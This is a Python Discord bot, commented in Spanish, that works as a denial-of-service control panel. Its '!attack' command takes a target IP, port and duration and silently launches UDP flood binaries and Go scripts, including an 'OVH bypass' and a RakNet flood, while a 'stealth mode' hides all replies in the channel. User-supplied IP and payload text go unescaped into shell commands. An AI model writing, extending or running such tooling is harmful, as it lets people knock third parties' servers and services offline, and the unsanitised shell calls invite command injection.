import os
import discord
from discord.ext import commands
import asyncio
import tempfile
import subprocess
import sys

BOT_PREFIX = '!'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)

# ========== SISTEMA DE TOKEN ==========
def get_or_request_token():
    token_file = 'token.txt'
    
    if os.path.exists(token_file):
        try:
            with open(token_file, 'r') as f:
                saved_token = f.read().strip()
                if saved_token:
                    print(f"[INFO] Token cargado desde {token_file}")
                    return saved_token
        except:
            pass
    
    print("\n" + "="*60)
    print("CONFIGURACIÓN REQUERIDA")
    print("="*60)
    print("1. Discord Developers → Applications → Bot → Copy Token")
    print("2. Pega el token aquí")
    print("="*60)
    
    import getpass
    user_token = getpass.getpass("Token del bot: ").strip()
    
    if not user_token:
        print("[ERROR] Token no proporcionado")
        exit(1)
    
    try:
        with open(token_file, 'w') as f:
            f.write(user_token)
        print(f"[INFO] Token guardado en {token_file}")
        return user_token
    except Exception as e:
        print(f"[ERROR] No se pudo guardar: {e}")
        return user_token

# ========== BOT CONFIGURADO ==========
@bot.event
async def on_ready():
    print(f'[✓] Bot: {bot.user.name}')
    print(f'[✓] Modo sigiloso: ACTIVADO')
    print(f'[✓] Prefijo: {BOT_PREFIX}')
    print(f'[✓] Métodos: udp, udphex, udppps, ovh, raknet, udpflood, udppayload')
    await bot.change_presence(activity=discord.Game(name="🔇 Modo Sigiloso"))

# ========== EJECUCIÓN SILENCIOSA ==========
async def ejecutar_silencioso(comando: str, desc: str = ""):
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        print(f"[RUN] {desc}: {comando[:80]}..." if len(comando) > 80 else f"[RUN] {desc}: {comando}")
        return True
    except Exception as e:
        print(f"[ERROR] {e}")
        return False

# ========== TODOS LOS MÉTODOS ==========
@bot.command(name='attack')
async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
    print(f"\n[CMD] {ctx.author} → !attack {metodo} {ip}:{port} {tiempo}s")
    
    if not all([metodo, ip, port, tiempo]):
        return
    
    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except:
        return
    
    if port_int < 1 or port_int > 65535:
        return
    if tiempo_int <= 0:
        return
    
    comando = None
    desc = ""
    
    # ========== UDP ==========
    if metodo == 'udp':
        comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
        desc = "UDP Flood"
    
    # ========== UDPHEX ==========
    elif metodo == 'udphex':
        comando = f'./udphex {ip} {port_int} {tiempo_int}'
        desc = "UDPHEX"
    
    # ========== UDPPPS ==========
    elif metodo == 'udppps':
        comando = f'./udppps {ip} {port_int} {tiempo_int}'
        desc = "UDPPPS"
    
    # ========== OVH ==========
    elif metodo == 'ovh':
        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
        desc = "OVH Bypass"
    
    # ========== RAKNET ==========
    elif metodo == 'raknet':
        comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
        desc = "RakNet Attack"
    
    # ========== UDPFLOOD ==========
    elif metodo == 'udpflood':
        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
        desc = "UDP Flood (Go)"
    
    # ========== UDPPAYLOAD ==========
    elif metodo == 'udppayload':
        if payload:
            if len(payload) > 250:
                return
            
            try:
                # Crear archivo temporal con el payload
                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                    f.write(payload)
                    temp_file = f.name
                
                comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
                desc = f"UDP Payload ({len(payload)} bytes)"
                
                # Programar eliminación del archivo temporal
                async def cleanup_tempfile():
                    await asyncio.sleep(2)
                    try:
                        os.unlink(temp_file)
                    except:
                        pass
                
                asyncio.create_task(cleanup_tempfile())
                
            except Exception as e:
                print(f"[ERROR] Payload: {e}")
                return
        else:
            return
    
    # ========== MÉTODO NO VÁLIDO ==========
    else:
        return
    
    # ========== EJECUTAR COMANDO ==========
    if comando:
        asyncio.create_task(ejecutar_silencioso(comando, desc))
        print(f"[EXEC] {desc} → {ip}:{port_int} por {tiempo_int}s")

# ========== COMANDO METHODS (SOLO LOG) ==========
@bot.command(name='methods')
async def show_methods(ctx):
    print(f"[CMD] {ctx.author} solicitó lista de métodos")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== COMANDO STATUS (SOLO LOG) ==========
@bot.command(name='status')
async def bot_status(ctx):
    print(f"[CMD] {ctx.author} solicitó estado")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== COMANDO STOP (SOLO LOG) ==========
@bot.command(name='stop')
async def stop_bot(ctx):
    print(f"[CMD] {ctx.author} ejecutó comando stop")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== INICIO ==========
if __name__ == "__main__":
    print("\n" + "="*60)
    print("BOT UDP - TODOS LOS MÉTODOS ACTIVOS")
    print("="*60)
    
    TOKEN = get_or_request_token()
    
    if not TOKEN or len(TOKEN) < 10:
        print("[ERROR] Token inválido")
        exit(1)
    
    print("[INFO] Métodos disponibles:")
    print("  !attack udp [IP] [PUERTO] [TIEMPO]")
    print("  !attack udphex [IP] [PUERTO] [TIEMPO]")
    print("  !attack udppps [IP] [PUERTO] [TIEMPO]")
    print("  !attack ovh [IP] [PUERTO] [TIEMPO]")
    print("  !attack raknet [IP] [PUERTO] [TIEMPO]")
    print("  !attack udpflood [IP] [PUERTO] [TIEMPO]")
    print("  !attack udppayload [IP] [PUERTO] [TIEMPO] [PAYLOAD]")
    print("="*60 + "\n")
    
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("[ERROR] Token incorrecto. Borra token.txt")
        exit(1)
    except Exception as e:
        print(f"[ERROR] {e}")
        exit(1)
